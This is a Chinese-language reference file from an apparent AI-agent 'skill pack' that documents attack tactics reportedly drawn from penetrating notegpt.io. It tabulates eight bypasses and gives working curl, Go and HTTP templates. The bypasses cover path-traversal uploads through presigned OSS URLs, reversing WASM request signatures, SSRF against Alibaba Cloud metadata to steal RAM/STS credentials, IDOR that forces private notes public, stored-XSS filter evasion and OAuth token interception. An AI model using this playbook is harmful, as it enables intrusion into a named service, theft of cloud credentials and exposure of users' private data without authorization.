# WASM 前端签名逆向与云存储 SaaS · 8 大踩坑记录与底层绕过手册

> 本文档为 `wasm-cloud-saas-tactics` 技能包支撑文件（`references/pitfalls-and-bypasses.md`），系统提炼自 `notegpt.io` 实战逆向与渗透过程。重点剖析 AI 在逆向前端 WASM 签名、利用云存储预签名 URL 与挖掘云元数据 SSRF 时最容易踩中的陷阱。

---

## 1. 踩坑与绕过全景矩阵

| 编号 | 常见踩坑场景 | 为什么常规打法会失败（陷阱根因） | 专家破局与绕过方案 | 3-Strike 止损红线 |
|---|---|---|---|---|
| **01** | 预签名 URL 包含 `../` 时发送 PUT 恒返回 `403 SignatureDoesNotMatch` | 服务端按字面量 `/notegpt/web/../../../deploy/x` 签名，而 `requests`/`curl`/浏览器发包前自动折叠 `../` 为 `/deploy/x`，导致 OSS 验签路径不匹配 | 使用 `curl --path-as-is -X PUT` 或 Go `req.URL.Opaque = rawPath` 保持原始未折叠的 `../` 请求行直接发往 OSS | 收到第 1 次 `SignatureDoesNotMatch` 即检查发包路径是否被客户端归一化，禁止盲目增减 `../` |
| **02** | 修改 `/api/v1/upload/sign-url` 参数即报签名无效 | 接口受前端 `crypto_util_bg.*.wasm` 生成的 `s`、`t`、`nonce` 签名保护 | 下载 `.wasm` 模块，用 `wasm2wat` 提取静态盐值与参数拼接顺序，编写本地签名重算函数后再注入 `biz: "../../../deploy"` | 发现 `s`/`nonce`/`t` 签名校验后 1 次即停，先逆向 `.wasm` 再发包 |
| **03** | 在 `/api/v1/docx-convert` 或 `/api/v2/audio-extract/start` 上死磕读取 `100.100.100.200` 凭证全文 | 转换器期望 DOCX/音频流，收到元数据 JSON 后解析报错，只能带出异常栈而无法完整回显长 JSON | 切换到「原样转存响应流至公开 OSS」的接口（`POST /api/v2/upload-screenshot` 的 `uploaded_screen_shot_url`），从返回的 CDN URL 直接下载完整 RAM 角色凭证 | 转换类接口拿到 Traceback 与端口探测结论后立即止损，不强求读出长文本 |
| **04** | 只找 SSRF 读云凭证，漏掉现成的未授权 STS 签发接口 | 惯性思维认为云凭证只能靠 SSRF 窃取，忽略了前端直传架构常暴露 STS Token 接口 | 在 API 路由与前端 JS 中搜索 `sts-token` / `credentials` / `oss`，直接测试 `GET /api/v1/oss/sts-token` 是否未授权直接返回 `AccessKeyId` 与 `SecurityToken` | 发现对象存储直传业务时，必同步测试预签名接口与 STS 令牌签发接口 |
| **05** | 查私有笔记越权只测直接读取，漏掉 `/api/v2/share` 强制公开 | 详情读取接口校验了当前登录用户，但分享接口未校验 `content_id` 归属且 ID 为自增整数 | 调用 `POST /api/v2/share` 传入自建测试账号的 `content_id`，验证可将目标私有笔记强制转为公开并返回 `share_id` 读取全文 | 单一 GET 详情接口越权失败后，必测同一资源的 `/share`、`/export`、`/continue` 动作端点 |
| **06** | 富文本编辑器前端过滤严密，认为不存在存储型 XSS | 直接在编辑器输入 `<script>` 被前端 DOMPurify 清洗 | 绕过前端编辑器：1) 走「导入他人分享笔记 (`/api/v2/notes/shared`)」后端入库通道注入未清洗 HTML；2) 走预签名上传 `.html`/`.svg` 至 `cdn.ng-resource.com` | 前端输入点被清洗满 2 次即转向「外部导入/同步接口」与「对象存储直传 Content-Type」 |
| **07** | OAuth 登录只测 `redirect_uri` 跳转，漏掉回调页 `postMessage` | `redirect_uri` 白名单校验严格，常规开放重定向无法利用 | 审计 `/auth/callback` 页面源码，发现 `window.opener.postMessage(tokenData, "*")`，任意恶意页面通过 `window.open` 即可监听截获 OAuth 令牌 | `redirect_uri` 白名单验证严格时立即停止变体枚举，转为静态审计回调页 JS 源码 |
| **08** | 报错信息探测只测常规参数，忽略边界枚举值（如 `plan_index=999`） | 正常参数范围只返回标准 JSON，隐藏了底层框架与数据库结构 | 对数值型下标/枚举字段传入越界值（如 `plan_index=999`）或对转换接口传特定 `type=2`，触发未捕获的 `IndexError` 暴露 Django/MySQL 完整调试栈与内网路径 | 每个核心业务模块最多用 1~2 个越界探针验证 Debug 栈是否开启，拿到栈信息后即止损 |

---

## 2. 关键技术细节与绕过代码模板

### 2.1 绕过 HTTP 客户端路径归一化发送 `../` 预签名 PUT（Go / curl 模板）

当预签名 URL 为 `https://bucket.oss-region.aliyuncs.com/notegpt/web/../../../deploy/poc.txt?OSSAccessKeyId=...&Expires=...&Signature=...` 时：

**方法一：使用 `curl --path-as-is`**
```bash
curl --path-as-is -i -X PUT \
  -H "Content-Type: text/plain" \
  --data-binary "audit-marker" \
  "https://bucket.oss-region.aliyuncs.com/notegpt/web/../../../deploy/poc.txt?OSSAccessKeyId=REDACTED&Expires=1700000000&Signature=REDACTED"
```

**方法二：在 Go 中使用 `url.URL.Opaque` 阻止 `net/http` 自动 `path.Clean`**
```go
u, _ := url.Parse(presignedURL)
// 将含 ../ 的原始路径放入 Opaque，阻止 Go 标准库自动折叠 ../
u.Opaque = "//" + u.Host + "/notegpt/web/../../../deploy/poc.txt"
req, _ := http.NewRequest("PUT", u.String(), strings.NewReader("audit-marker"))
req.Header.Set("Content-Type", "text/plain")
```

### 2.2 利用截图转存接口全回显读取阿里云 `100.100.100.200` RAM 凭证流程

```http
POST /api/v2/upload-screenshot HTTP/1.1
Host: target-saas.example
Content-Type: application/json

{
  "uploaded_screen_shot_url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/"
}
```
响应返回转存后的公网 OSS 地址（如 `https://cdn.example.com/screenshots/xxx.png`），直接 `GET` 该地址即可拿到文本内容（角色名 `KubernetesWorkerRole-xxx`），随后再次调用该接口读取 `http://100.100.100.200/latest/meta-data/ram/security-credentials/KubernetesWorkerRole-xxx` 获取完整 STS 临时凭证 JSON。
